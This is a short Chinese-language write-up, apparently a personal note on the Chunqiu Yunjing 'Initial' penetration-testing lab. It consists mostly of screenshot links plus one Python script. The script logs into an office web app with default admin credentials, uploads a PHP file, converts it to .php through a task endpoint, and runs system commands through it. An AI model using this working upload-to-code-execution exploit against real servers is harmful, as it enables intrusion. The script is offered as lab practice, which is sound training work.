## 文章

[记一次春秋云镜域渗透靶场Initial - 先知社区](F:\LocalCTF\记一次春秋云镜域渗透靶场Initial - 先知社区.html)

## 打靶记录

![image-20231009224946360](C:\Users\绮洛\AppData\Roaming\Typora\typora-user-images\image-20231009224946360.png)

![image-20231009225031687](C:\Users\绮洛\AppData\Roaming\Typora\typora-user-images\image-20231009225031687.png)

![image-20231009225316879](C:\Users\绮洛\AppData\Roaming\Typora\typora-user-images\image-20231009225316879.png)

![image-20231009225324750](C:\Users\绮洛\AppData\Roaming\Typora\typora-user-images\image-20231009225324750.png)

![image-20231010001121327](C:\Users\绮洛\AppData\Roaming\Typora\typora-user-images\image-20231010001121327.png)

![image-20231010001541398](C:\Users\绮洛\AppData\Roaming\Typora\typora-user-images\image-20231010001541398.png)

![image-20231009231620286](C:\Users\绮洛\AppData\Roaming\Typora\typora-user-images\image-20231009231620286.png)

![image-20231010001701014](C:\Users\绮洛\AppData\Roaming\Typora\typora-user-images\image-20231010001701014.png)

![image-20231009231718955](C:\Users\绮洛\AppData\Roaming\Typora\typora-user-images\image-20231009231718955.png)

![image-20231009231846276](C:\Users\绮洛\AppData\Roaming\Typora\typora-user-images\image-20231009231846276.png![image-20231010002040523](C:\Users\绮洛\AppData\Roaming\Typora\typora-user-images\image-20231010002040523.png)

![image-20231010003334683](C:\Users\绮洛\AppData\Roaming\Typora\typora-user-images\image-20231010003334683.png)

```python
import requests


session = requests.session()

url_pre = 'http://172.22.1.18/'
url1 = url_pre + '?a=check&m=login&d=&ajaxbool=true&rnd=533953'
url2 = url_pre + '/index.php?a=upfile&m=upload&d=public&maxsize=100&ajaxbool=true&rnd=798913'
url3 = url_pre + '/task.php?m=qcloudCos|runt&a=run&fileid=11'

data1 = {
    'rempass': '0',
    'jmpass': 'false',
    'device': '1625884034525',
    'ltype': '0',
    'adminuser': 'YWRtaW4=',
    'adminpass': 'YWRtaW4xMjM=',
    'yanzm': ''
}


r = session.post(url1, data=data1)
r = session.post(url2, files={'file': open('1.php', 'r+')})

filepath = str(r.json()['filepath'])
filepath = "/" + filepath.split('.uptemp')[0] + '.php'
id = r.json()['id']
print(id)
print(filepath)
url3 = url_pre + f'/task.php?m=qcloudCos|runt&a=run&fileid={id}'

r = session.get(url3)
r = session.get(url_pre + filepath + "?1=system('dir');")
print(r.text)
```

![image-20231010003800715](C:\Users\绮洛\AppData\Roaming\Typora\typora-user-images\image-20231010003800715.png)

![image-20231010004051909](C:\Users\绮洛\AppData\Roaming\Typora\typora-user-images\image-20231010004051909.png)

![image-20231010013134481](C:\Users\绮洛\AppData\Roaming\Typora\typora-user-images\image-20231010013134481.png)
